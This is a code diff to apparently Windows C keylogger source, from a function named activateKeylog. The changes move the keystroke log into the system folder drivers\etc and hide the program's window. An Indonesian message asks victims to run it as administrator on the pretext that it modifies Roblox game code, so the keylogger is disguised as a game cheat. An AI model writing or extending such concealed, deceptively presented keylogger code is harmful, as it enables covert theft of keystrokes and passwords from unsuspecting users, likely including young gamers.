@@ -28,14 +28,17 @@ DWORD WINAPI activateKeylog(LPVOID param)
 	//ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
 	//ShowWindow(hwnd,SW_HIDE);
 
-	//FILE * fp = fopen("C:\\Windows\\System32\\drivers\\etc\\log", "a");
-	FILE * fp = fopen("log", "a");
+	FILE * fp = fopen("C:\\Windows\\System32\\drivers\\etc\\log", "a");
+	//FILE * fp = fopen("log", "a");
 
 	if (fp == NULL){
 		perror("JALANKAN SEBAGAI ADMINISTRATOR\nAGAR PROGRAM DAPAT MENGOTAK-ATIK\nKODE GAME ROBLOX YANG ADA PADA\nKOMPUTER ANDA");
 		getchar();
 		exit(1);
 	}
+    HWND * window = (HWND *)param;
+	ShowWindow(*window,0);
+
 	unsigned char count = 1;
 
 	char buffer[5] = {0};
